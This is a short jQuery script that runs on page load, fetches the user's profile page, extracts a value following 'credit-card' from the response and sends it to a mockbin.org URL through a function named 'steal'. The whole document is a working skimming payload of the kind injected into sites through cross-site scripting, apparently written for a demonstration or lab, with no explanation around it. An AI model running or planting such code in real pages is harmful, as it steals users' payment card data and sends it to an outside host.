$(document).ready(function() {
  getCc().then(steal);

  function steal(data) {
    return $.ajax("https://mockbin.org/bin/97005302-c385-4843-9dbd-516bc235e75d?data=" + data);
  }

  function getCc() {
    return $.ajax($('#profile-link a')[0].href)
      .then(function(res) { return res.substring(res.indexOf("credit-card")+13,res.indexOf("==")+2) });
  }
});
